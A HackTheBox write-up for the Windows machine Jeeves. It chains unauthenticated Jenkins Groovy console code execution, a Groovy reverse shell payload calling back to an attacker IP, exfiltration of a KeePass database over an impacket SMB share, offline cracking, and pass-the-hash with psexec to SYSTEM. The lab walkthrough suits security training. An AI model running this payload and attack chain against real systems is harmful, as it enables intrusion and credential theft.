---
title: "HTB - Jeeves (Medium | Windows | Web)"
date: 2026-09-13 00:00:00 +0000
categories: [HackTheBox, Web]
tags: [htb, jenkins, jetty, gobuster, psexec, windows, keepass, ads, rce, groovy, pass-the-hash, credential-extraction, iis, smb]
description: "Unauthenticated Jenkins Groovy RCE, then KeePass cracking & pass-the-hash to Administrator"
image:
  path: /assets/img/jeeves-1200x600.gif
---

## Reconnaissance Phase

### Initial Network Scanning

The reconnaissance phase begins with a comprehensive network scan to identify open ports and running services on the target machine.

```bash
sudo nmap -p- 10.129.228.112 -sSCV --min-rate 5000
```

```bash
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)

Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h59m50s, deviation: 0s, median: 4h59m50s
| smb2-time: 
|   date: 2026-09-07T14:46:03
|_  start_date: 2026-09-07T14:42:09
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

### Service Discovery Analysis

The Nmap scan reveals four key services running on the target machine:

- **HTTP (Port 80):** Microsoft IIS 10.0 hosting an "Ask Jeeves" search engine interface
- **RPC (Port 135):** Microsoft Windows RPC endpoint
- **SMB (Port 445):** Microsoft Windows file sharing (workgroup: WORKGROUP)
- **HTTP (Port 50000):** Jetty 9.4.z-SNAPSHOT web server, indicating a Java-based application

The presence of Jetty running on port 50000 combined with the older IIS on port 80 suggests this machine may be running a Java application, potentially Jenkins.

---

## Enumeration Phase

### Port 80 - IIS Web Server

The primary web server on port 80 hosts an "Ask Jeeves" search engine interface.

![Ask Jeeves Interface](/assets/img/Pasted_image_20260908012720.png)

The interface appears to be a frontend search application with limited functionality.

### Port 445 - SMB Enumeration

Attempts to connect via SMB using smbclient result in **NT_STATUS_ACCESS_DENIED**, indicating restricted access without valid credentials.

### Port 50000 - Jetty Web Server

Directory brute-forcing using GoBuster against port 50000:

```bash
gobuster dir -u http://10.129.228.112:50000/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

![GoBuster Scan Results 1](/assets/img/Pasted_image_20260908014355.png)

![GoBuster Scan Results 2](/assets/img/Pasted_image_20260908020154.png)

The scan reveals several directories, including `/queue`, `/log`, and most importantly, a path leading to Jenkins.

### Jenkins Discovery

Further enumeration of the Jetty server reveals Jenkins is installed and accessible. The `/scripts` section of Jenkins can be exploited using Groovy script execution, which is a built-in feature of Jenkins for administrative scripting.

A simple test command execution demonstrates code execution capability:

```groovy
def cmd = 'whoami'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

![Jenkins Groovy Test](/assets/img/Pasted_image_20260908020221.png)

The script successfully executes and returns output, confirming unauthenticated code execution on the target system.

---

## Exploitation Phase - Initial Access

### Jenkins Groovy Script RCE

Jenkins allows unauthenticated access to the Groovy script console, which can execute arbitrary code on the underlying system. This vulnerability is leveraged to establish a reverse shell connection.

**Step 1: Set Up Listener**

On the attacker's machine, establish a reverse shell listener using netcat with rlwrap for better shell interaction:

```bash
sudo rlwrap -cAr nc -lvnp 4444
```

**Step 2: Craft Reverse Shell Payload**

Develop a Groovy payload that establishes a reverse TCP connection, combining Java sockets with process management:

```groovy
String host="10.10.17.173";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();
```

**Step 3: Execute Payload**

Inject the Groovy payload into the Jenkins script console. Upon execution, the target system initiates a reverse connection to the attacker's listener.

![Jenkins RCE Payload](/assets/img/Pasted_image_20260908020511.png)

**Step 4: Shell Access Achieved**

A command shell is established as the kohsuke user, the default user running the Jenkins service. The user flag can be retrieved from the user's Desktop:

```powershell
C:\Users\kohsuke\Desktop\user.txt
```

---

## Privilege Escalation

### Step 1: Discover KeePass Database

While exploring the file system from the kohsuke session, a KeePass database file (CEH.kdbx) is discovered in the Documents folder:

```powershell
C:\Users\kohsuke\Documents\CEH.kdbx
```

KeePass is a password manager that stores encrypted credentials. The .kdbx file format is proprietary and requires a master password to unlock.

### Step 2: Exfiltrate KeePass Database

Set up an SMB server on the attacker's machine to receive the KeePass file:

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user kali -password kali
```

From the kohsuke shell, connect to the SMB server and copy the KeePass database:

```powershell
net use Z: \\10.10.17.173\share /user:kali kali
copy C:\Users\kohsuke\Documents\CEH.kdbx \\10.10.17.173\share\

1 file(s) copied.
```

The KeePass database is successfully transferred to the attacker's machine.

### Step 3: Crack KeePass Master Password

Convert the KeePass database to a hash format that can be cracked offline:

```bash
keepass2john CEH.kdbx > kp.hash
```

Use John the Ripper to crack the password against the rockyou.txt wordlist:

```bash
john kp.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![John Cracking KeePass](/assets/img/Pasted_image_20260908021042.png)

**Result:** The KeePass master password is cracked to **moonshine1**

### Step 4: Extract Credentials from KeePass

Open the KeePass database with the cracked password using KeePass2:

```bash
keepass2 CEH.kdbx
```

![KeePass Database Content](/assets/img/Pasted_image_20260908021112.png)

The database contains several stored credentials, including an NTLM hash for the Administrator user. The hash is extracted for lateral movement.

**Discovered Credentials:**

- Administrator NTLM Hash: `e0fb1fb85756c24235ff238cbe81fe00`

### Step 5: Authenticate as Administrator

Since WinRM is not enabled on the victim machine, use PsExec with the NTLM hash for pass-the-hash authentication:

```bash
impacket-psexec -hashes :e0fb1fb85756c24235ff238cbe81fe00 Administrator@10.129.228.112 cmd.exe
```

![PsExec Authentication](/assets/img/Pasted_image_20260908021622.png)

A command shell is established with Administrator privileges. The user context shows `nt authority\system`, indicating full system-level access.

### Step 6: Retrieve Root Flag

Use the `/R` parameter to enumerate and read Alternate Data Streams (ADS) on the Desktop, as the actual flag may be hidden in an ADS:

```powershell
cd C:\Users\Administrator\Desktop
dir /R
```

![Enumerate Alternate Data Streams](/assets/img/Pasted_image_20260908021806.png)

The root flag file is visible in the directory listing.

### Step 7: Extract Alternate Data Stream Flag

Alternate Data Streams are revealed, potentially containing the root flag. Extract the flag from the ADS:

```powershell
more < hm.txt:root.txt:$DATA
```

![Extract ADS Flag](/assets/img/Pasted_image_20260908021829.png)

---

## Attack Chain Summary

1. **Reconnaissance:** Nmap scan identified IIS on port 80 and Jetty on port 50000
2. **Enumeration:** Directory brute-forcing with GoBuster discovered Jenkins running on port 50000
3. **Initial Access:** Exploited unauthenticated Jenkins Groovy script console to execute arbitrary code and establish reverse shell as kohsuke user
4. **Credential Discovery:** Found KeePass database (CEH.kdbx) in kohsuke's Documents folder
5. **Password Cracking:** Exfiltrated KeePass database and cracked master password using John the Ripper
6. **Credential Extraction:** Opened KeePass database and extracted Administrator NTLM hash
7. **Privilege Escalation:** Used PsExec with pass-the-hash to authenticate as Administrator
8. **Root Access:** Achieved SYSTEM-level access and retrieved root flag from Alternate Data Stream

---

## Key Takeaways

- **Unauthenticated Jenkins** instances are critical security risks — the Groovy script console provides direct RCE
- **Password managers like KeePass** should be protected with strong master passwords and their databases should never be stored on accessible systems
- **Alternate Data Streams (ADS)** in Windows can be used to hide files or data; always check for them during post-exploitation
- **Pass-the-hash attacks** are effective when NTLM hashes are captured from password managers
- **Jetty/Jenkins** configurations should restrict script execution to authenticated users only
- **GoBuster** is an effective tool for discovering hidden directories and endpoints on web servers
- **SMB servers** can be quickly deployed with impacket for exfiltrating data from compromised systems
